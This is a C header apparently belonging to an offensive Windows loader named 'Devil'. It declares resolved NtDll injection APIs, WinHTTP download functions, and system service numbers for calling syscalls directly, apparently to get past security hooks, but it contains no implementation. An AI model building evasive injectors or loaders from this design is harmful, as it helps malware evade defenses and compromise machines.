#pragma once
#ifndef DEVIL_H
#define DEVIL_H

#pragma warning( error: 4013 ) // error on implicit function declarations, cuz we don't want to go insane over a silent pointer decay

#define PHNT_VERSION PHNT_WIN11
#include <common/phnt.h>
#include <winhttp.h>
#include <common/Macros.h>
#include <Config.h>


typedef struct _BUFFER {
    PVOID  Buffer;
    SIZE_T Length;
} BUFFER, *PBUFFER;

typedef struct // Instance
{
    PTEB Teb;
    //PVOID ModuleBase;
    //DWORD ModuleSize;

    struct // NtDll
    {
        WIN_API( LdrLoadDll )
        WIN_API( LdrGetProcedureAddress )

        WIN_API( RtlAllocateHeap )
        WIN_API( RtlReAllocateHeap )
        WIN_API( RtlFreeHeap )

        WIN_API( NtQuerySystemInformation )
        WIN_API( NtOpenProcess )

        WIN_API( NtAllocateVirtualMemory )
        WIN_API( NtWriteVirtualMemory )
        WIN_API( NtProtectVirtualMemory )
        WIN_API( NtCreateThreadEx )
        WIN_API( NtGetContextThread )
        WIN_API( NtSetContextThread )
        WIN_API( NtResumeThread )
        WIN_API( NtWaitForSingleObject )

        WIN_API( NtTerminateThread )
        WIN_API( NtTerminateProcess )

        WIN_API( NtClose )
    }
    NtDll;

    struct // WinHttp
    {
        WIN_API( WinHttpOpen )
        WIN_API( WinHttpConnect )
        WIN_API( WinHttpOpenRequest )
        WIN_API( WinHttpSetOption )
        WIN_API( WinHttpSendRequest )
        WIN_API( WinHttpReceiveResponse )
        WIN_API( WinHttpQueryHeaders )
        WIN_API( WinHttpReadData )
        WIN_API( WinHttpCloseHandle )
    }
    WinHttp;

    struct // Syscall
    {
        WORD   SysSsn;      /* System Service Number (SSN) */
        PVOID  SysAddress;  /* `syscall` instruction pointer */

        /* System Service Numbers */
        WORD NtQuerySystemInformation;
        WORD NtOpenProcess;

        WORD NtAllocateVirtualMemory;
        WORD NtWriteVirtualMemory;
        WORD NtProtectVirtualMemory;
        WORD NtCreateThreadEx;
        WORD NtGetContextThread;
        WORD NtSetContextThread;
        WORD NtResumeThread;
        WORD NtWaitForSingleObject;

        WORD NtTerminateThread;
        WORD NtTerminateProcess;

        WORD NtClose;
    }
    Syscall;

    struct // Modules
    {
        PVOID NtDll;
        PVOID Win32u;
        PVOID WinHttp;
    }
    Modules;

} INSTANCE, *PINSTANCE;

extern PINSTANCE Instance;


VOID LdrMain( VOID );
VOID LdrInit( VOID );
VOID LdrRoutine( VOID );

#endif // DEVIL_H